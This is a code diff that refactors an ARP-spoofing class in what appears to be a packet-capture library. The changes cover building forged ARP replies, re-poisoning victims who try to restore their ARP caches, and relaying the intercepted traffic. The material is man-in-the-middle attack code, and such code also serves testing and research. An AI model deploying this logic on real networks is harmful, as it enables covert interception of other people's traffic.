@@ -213,6 +213,8 @@ SnoopArpSpoof::SnoopArpSpoof(void* owner) : SnoopAdapter(owner), sessionList(thi
 {
   virtualMac            = Mac::cleanMac();
   selfRelay             = true;
+  autoRoutingTtls.push_back(127);
+  autoRoutingTtls.push_back(254);
   infectInterval        = 1000; // 1 sec
   sessionList.clear();
 
@@ -308,25 +310,7 @@ int SnoopArpSpoof::read(SnoopPacket* packet)
   //
   if (packet->arpHdr != NULL)
   {
-    ArpPacketType arpPacketType = preventArpRecover(packet->ethHdr, packet->arpHdr);
-    switch (arpPacketType)
-    {
-      case arpNone:
-        LOG_FATAL("preventArpRecover return arpNone");
-        break;
-      case arpSender:
-        emit captured(packet);
-        break;
-      case arpInfect:
-        emit capturedSpoof(packet);
-        break;
-      case arpRecover:
-        emit capturedSpoof(packet);
-        break;
-      case arpOther:
-        emit capturedOther(packet);
-        break;
-    }
+    preventArpRecover(packet->ethHdr, packet->arpHdr);
     return 0;
   }
 
@@ -349,6 +333,7 @@ int SnoopArpSpoof::read(SnoopPacket* packet)
       LOG_FATAL("findSessionByIpPacket return ipNone");
       res = -1;
       break;
+
     case ipSender:
       packet->ethHdr->ether_dhost = session->targetMac;
       if (!bpFilter._check(packet->pktData, (UINT)packet->pktHdr->caplen))
@@ -358,18 +343,14 @@ int SnoopArpSpoof::read(SnoopPacket* packet)
         res = 0;
       }
       break;
-    case ipSpoofed:
-      emit capturedSpoof(packet);
-      res = 0;
-      break;
+
     case ipRelay:
       emit capturedSpoof(packet);
       res = 0;
       break;
-    case ipSelfRelay:
-      emit capturedSpoof(packet);
-      res = 0;
-      break;
+
+    case ipSelfSpoofed:
+    case ipAutoRouting:
     case ipOther:
       capturedOther(packet);
       res = 0;
@@ -504,7 +485,7 @@ bool SnoopArpSpoof::retrieveUnknownMacHostList()
   return true;
 }
 
-bool SnoopArpSpoof::sendArpInfect(SnoopArpSpoofSession* session)
+bool SnoopArpSpoof::sendArpInfect(SnoopArpSpoofSession& session)
 {
   static const int BUF_SIZE = sizeof(ETH_HDR) + sizeof(ARP_HDR);
   BYTE buf[BUF_SIZE];
@@ -514,7 +495,7 @@ bool SnoopArpSpoof::sendArpInfect(SnoopArpSpoofSession* session)
   //
   // Set ethHdr
   //
-  ethHdr->ether_dhost = session->senderMac;
+  ethHdr->ether_dhost = session.senderMac;
   ethHdr->ether_shost = this->realVirtualMac;
   ethHdr->ether_type  = htons(ETHERTYPE_ARP);
 
@@ -527,9 +508,9 @@ bool SnoopArpSpoof::sendArpInfect(SnoopArpSpoofSession* session)
   arpHdr->ar_pln = sizeof(Ip);
   arpHdr->ar_op  = htons(ARPOP_REPLY);
   arpHdr->ar_sa  = this->realVirtualMac;
-  arpHdr->ar_si  = htonl(session->targetIp);
-  arpHdr->ar_ta  = session->senderMac;
-  arpHdr->ar_ti  = htonl(session->senderIp);
+  arpHdr->ar_si  = htonl(session.targetIp);
+  arpHdr->ar_ta  = session.senderMac;
+  arpHdr->ar_ti  = htonl(session.senderIp);
 
   // send ARP packet
   int res = write(buf, BUF_SIZE);
@@ -548,7 +529,7 @@ bool SnoopArpSpoof::sendArpInfectAll()
   for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
   {
     SnoopArpSpoofSession& session = *it;
-    if (!sendArpInfect(&session))
+    if (!sendArpInfect(session))
     {
       return false;
     }
@@ -556,7 +537,7 @@ bool SnoopArpSpoof::sendArpInfectAll()
   return true;
 }
 
-bool SnoopArpSpoof::sendArpRecover(SnoopArpSpoofSession* session)
+bool SnoopArpSpoof::sendArpRecover(SnoopArpSpoofSession& session)
 {
   static const int BUF_SIZE = sizeof(ETH_HDR) + sizeof(ARP_HDR);
   BYTE buf[BUF_SIZE];
@@ -566,7 +547,7 @@ bool SnoopArpSpoof::sendArpRecover(SnoopArpSpoofSession* session)
   //
   // Set ethHdr
   //
-  ethHdr->ether_dhost = session->senderMac;
+  ethHdr->ether_dhost = session.senderMac;
   ethHdr->ether_shost = this->realVirtualMac;
   ethHdr->ether_type  = htons(ETHERTYPE_ARP);
 
@@ -578,10 +559,10 @@ bool SnoopArpSpoof::sendArpRecover(SnoopArpSpoofSession* session)
   arpHdr->ar_hln = sizeof(Mac);
   arpHdr->ar_pln = sizeof(Ip);
   arpHdr->ar_op  = htons(ARPOP_REPLY);
-  arpHdr->ar_sa  = session->targetMac;
-  arpHdr->ar_si  = htonl(session->targetIp);
-  arpHdr->ar_ta  = session->senderMac;
-  arpHdr->ar_ti  = htonl(session->senderIp);
+  arpHdr->ar_sa  = session.targetMac;
+  arpHdr->ar_si  = htonl(session.targetIp);
+  arpHdr->ar_ta  = session.senderMac;
+  arpHdr->ar_ti  = htonl(session.senderIp);
 
   // send ARP packet
   int res = write(buf, BUF_SIZE);
@@ -600,7 +581,7 @@ bool SnoopArpSpoof::sendArpRecoverAll()
   for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
   {
     SnoopArpSpoofSession& session = *it;
-    if (!sendArpRecover(&session))
+    if (!sendArpRecover(session))
     {
       return false;
     }
@@ -608,56 +589,78 @@ bool SnoopArpSpoof::sendArpRecoverAll()
   return true;
 }
 
-SnoopArpSpoof::ArpPacketType SnoopArpSpoof::preventArpRecover(ETH_HDR* ethHdr, ARP_HDR* arpHdr)
+void SnoopArpSpoof::preventArpRecover(ETH_HDR* ethHdr, ARP_HDR* arpHdr)
 {
+  Mac    srcMac    = ethHdr->ether_shost;
+  Mac    dstMac    = ethHdr->ether_dhost;
+
   UINT16 operation = ntohs(arpHdr->ar_op);
   Mac    senderHa  = arpHdr->ar_sa;
   Ip     senderIp  = ntohl(arpHdr->ar_si);
   Mac    targetHa  = arpHdr->ar_ta;
   Ip     targetIp  = htonl(arpHdr->ar_ti);
 
-  ArpPacketType res = arpOther;
   for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
   {
     SnoopArpSpoofSession& session = *it;
 
     //
-    // If ARP packet is my own infect packet, do not anything
+    // If my own ARP infection packet, do not anything
     //
     if (
-      ethHdr->ether_shost == realVirtualMac &&
-      ethHdr->ether_dhost == session.senderMac &&
+      srcMac == realVirtualMac &&
+      dstMac == session.senderMac &&
 
       operation == ARPOP_REPLY &&
-      senderHa  == this->realVirtualMac &&
+      senderHa  == realVirtualMac &&
       senderIp  == session.targetIp &&
       targetHa  == session.senderMac &&
       targetIp  == session.senderIp)
     {
-      // continue; // gilgil temp 2014.03.28
-      return arpInfect;
+      continue;
     }
 
     //
-    // If ARP packet recover SnoopARPSpoofSession, send ARP infect packet.
+    // If Target sending ARP packet?
     //
-    if (
-      ethHdr->ether_shost == session.senderMac &&
-      // Do not check ethHdr->dst
-
-      // Do not check operation
-      senderHa == session.senderMac &&
-      // Do not check senderIp
-      // Do not check targetHa
-      targetIp == session.targetIp)
+    if (srcMac == session.targetMac)
     {
-      sendArpInfect(&session);
-      LOG_DEBUG("send ARP infect(%s > %s)", qPrintable(session.senderIp.str()), qPrintable(session.targetIp.str()));
-      // res = true; // gilgil temp 2014.03.28
-      res = arpSender;
+      //
+      //  If it recovers Sender?
+      //
+      if (dstMac == session.senderMac)
+      {
+        sendArpInfect(session);
+        continue;
+      }
+      if (dstMac == Mac::broadcastMac())
+      {
+        for (SnoopArpSpoofSessionList::iterator it2 = sessionList.begin(); it2 != sessionList.end(); it2++)
+        {
+          SnoopArpSpoofSession& session2 = *it2;
+
+          if (session2.targetMac == srcMac)
+          {
+            sendArpInfect(session2);
+            LOG_DEBUG("send ARP infect(%s > %s)", qPrintable(session2.senderIp.str()), qPrintable(session2.targetIp.str()));
+          }
+        }
+        continue;
+      }
+    }
+
+    //
+    // If Sender ARP packet?
+    //
+    if (srcMac == session.senderMac)
+    {
+      if (senderHa == session.senderMac && targetIp == session.targetIp)
+      {
+        sendArpInfect(session);
+        LOG_DEBUG("send ARP infect(%s > %s)", qPrintable(session.senderIp.str()), qPrintable(session.targetIp.str()));
+      }
     }
   }
-  return res;
 }
 
 SnoopArpSpoof::IpPacketType SnoopArpSpoof::findSessionByIpPacket(SnoopPacket* packet, SnoopArpSpoofSession** _session)
@@ -665,30 +668,47 @@ SnoopArpSpoof::IpPacketType SnoopArpSpoof::findSessionByIpPacket(SnoopPacket* pa
   LOG_ASSERT(packet->ethHdr != NULL);
   LOG_ASSERT(packet->ipHdr  != NULL);
 
-  IpPacketType res = ipOther;
+  Mac srcMac = packet->ethHdr->ether_shost;
+  Mac dstMac = packet->ethHdr->ether_dhost;
 
   //
   // If broadcast IP Packet?
   //
-  if (packet->ethHdr->ether_dhost.isBroadcast()) return res;
-  if (packet->ethHdr->ether_dhost.isMulticast()) return res;
+  if (dstMac.isBroadcast()) return ipOther;
+  if (dstMac.isMulticast()) return ipOther;
+
+  //
+  // If Auto Routing IP packet by OS?
+  //
+  if (autoRoutingTtls.indexOf(packet->ipHdr->ip_ttl) != -1) return ipAutoRouting;
+
+  Ip adjSrcIp = netInfo.getAdjIp(ntohl(packet->ipHdr->ip_src));
+  Ip adjDstIp = netInfo.getAdjIp(ntohl(packet->ipHdr->ip_dst));
 
   //
   // Find session
   //
-  Ip adjSrcIp = netInfo.getAdjIp(ntohl(packet->ipHdr->ip_src));
-  Ip adjDstIp = netInfo.getAdjIp(ntohl(packet->ipHdr->ip_dst));
   for (SnoopArpSpoofSessionList::iterator it = sessionList.begin(); it != sessionList.end(); it++)
   {
     SnoopArpSpoofSession& session = *it;
+
     if (
-      packet->ethHdr->ether_shost == session.senderMac &&
-      adjSrcIp                    == session.senderIp &&
-      packet->ethHdr->ether_dhost == realVirtualMac &&
-      adjDstIp                    == session.targetIp)
+      srcMac    == session.senderMac &&
+      dstMac    == realVirtualMac &&
+      adjSrcIp  == session.senderIp &&
+      adjDstIp  == session.targetIp)
     {
       *_session = &session;
       return ipSender;
+    }
+
+    if (
+      srcMac    == realVirtualMac &&
+      dstMac    == session.targetMac &&
+      adjSrcIp  == session.senderIp &&
+      adjDstIp  == session.targetIp)
+    {
+      return ipRelay;
     }
   }
 
@@ -698,17 +718,18 @@ SnoopArpSpoof::IpPacketType SnoopArpSpoof::findSessionByIpPacket(SnoopPacket* pa
   if (selfRelay)
   {
     if (
-      packet->ethHdr->ether_shost  == netInfo.mac &&
-      packet->ethHdr->ether_dhost  == realVirtualMac &&
+      srcMac == netInfo.mac &&
+      dstMac == realVirtualMac &&
       ntohl(packet->ipHdr->ip_src) == netInfo.ip)
     {
       SnoopHost* host = this->findHost.hostList.findByIp(adjDstIp);
       LOG_ASSERT(host != NULL);
       packet->ethHdr->ether_dhost = host->mac;
       relay(packet);
-      return ipSelfRelay;
+      return ipSelfSpoofed;
     }
   }
+
   return ipOther;
 }
 
